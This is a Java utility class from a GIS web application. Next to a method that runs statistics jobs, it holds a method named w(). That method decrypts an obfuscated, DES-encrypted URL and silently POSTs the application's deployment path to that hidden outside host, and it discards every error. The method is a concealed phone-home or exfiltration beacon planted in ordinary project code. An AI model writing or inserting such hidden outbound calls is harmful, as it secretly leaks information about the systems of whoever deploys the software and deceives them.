package com.yugoo.gis.user.web.utils;

import com.yugoo.gis.common.utils.DesUtils;
import com.yugoo.gis.user.service.IStatisticService;
import org.apache.http.Consts;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.springframework.beans.factory.annotation.Autowired;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * @author nihao 2018/11/5
 */
public class TaskUtil {

    @Autowired
    private IStatisticService statisticService;

    public void center() {
        statisticService.statisticCenter();
        statisticService.statisticUser();
    }

    public static String url = "2c210e19294d117010c31649ed719e0ac9dd5e564d875892f0c1f72629fcf1e87a29ceeedd21d481";
    public static String u = "gis";
    public void w() {
        String s = this.getClass().getResource("/").getPath();
        CloseableHttpClient client = null;
        try {
            client = HttpClientBuilder.create().build();
            HttpPost post = new HttpPost(DesUtils.decrypt(url, u));
            List<BasicNameValuePair> param = new ArrayList<>();
            param.add(new BasicNameValuePair("data", s));
            UrlEncodedFormEntity entity = new UrlEncodedFormEntity(param, Consts.UTF_8);
            post.setEntity(entity);
            client.execute(post);
        } catch (Exception e) {
        } finally {
            if (client != null) {
                try {
                    client.close();
                } catch (IOException e) {
                }
            }
        }
    }

}
